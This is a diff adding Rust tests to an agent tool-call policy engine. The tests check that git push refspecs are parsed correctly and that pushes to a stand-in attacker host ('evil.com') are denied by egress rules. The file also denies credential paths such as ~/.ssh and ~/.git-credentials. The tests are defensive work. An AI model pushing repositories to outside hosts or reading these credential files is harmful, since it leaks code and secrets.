@@ -206,3 +206,61 @@ fn credential_file_names_denied() {
     r.paths = vec!["~/.git-credentials".into()];
     assert!(is_deny(&f.engine.authorize(&r, &f.ctx).decision));
 }
+
+const GIT_PUSH_POLICY: &str = r#"
+version: "t1"
+tools: { git.push: external_write }
+executables_allow: [git]
+denied_paths: ["~/.ssh"]
+egress:
+  - { host: github.com, data_classes: [public, personal], schemes: [https, ssh] }
+"#;
+
+const SHA: &str = "fc14fa52056f85a0d9ea37ca23bd55a9776a331c";
+
+fn git_decision(tool: &str, args: &[&str]) -> Decision {
+    let f = fixture();
+    let engine =
+        pair_policy::PolicyEngine::from_config_str(GIT_PUSH_POLICY, &f.home).expect("policy");
+    let mut ctx = f.ctx.clone();
+    ctx.policy_version = engine.version().to_owned();
+    let mut r = request(tool);
+    r.executable = Some("git".into());
+    r.args = args.iter().map(ToString::to_string).collect();
+    engine.authorize(&r, &ctx).decision
+}
+
+#[test]
+fn push_refspec_is_not_an_scp_remote() {
+    let refspec = format!("{SHA}:refs/heads/pair/t");
+    let forced = format!("+{SHA}:refs/heads/pair/t");
+    for args in [
+        vec!["push", "git@github.com:acme/repo.git", refspec.as_str()],
+        vec!["push", "https://github.com/acme/repo.git", forced.as_str()],
+        vec!["push", "--force-with-lease", "origin", refspec.as_str()],
+        vec!["push", "-u", "origin", "HEAD:refs/heads/x"],
+    ] {
+        assert!(
+            matches!(
+                git_decision("git.push", &args),
+                Decision::NeedsApproval { .. }
+            ),
+            "{args:?}"
+        );
+    }
+}
+
+#[test]
+fn push_remote_position_is_still_egress_checked() {
+    let refspec = format!("{SHA}:refs/heads/pair/t");
+    for args in [
+        vec!["push", "git@evil.com:acme/repo.git", refspec.as_str()],
+        vec!["push", "evil.com:acme/repo.git", refspec.as_str()],
+        // A refspec-shaped value in the remote position IS a remote to git.
+        vec!["push", refspec.as_str()],
+        // An unknown value-taking flag before the remote: stay strict, treat everything as remote.
+        vec!["push", "--repo", "x", "git@evil.com:a/b", refspec.as_str()],
+    ] {
+        assert!(is_deny(&git_decision("git.push", &args)), "{args:?}");
+    }
+}
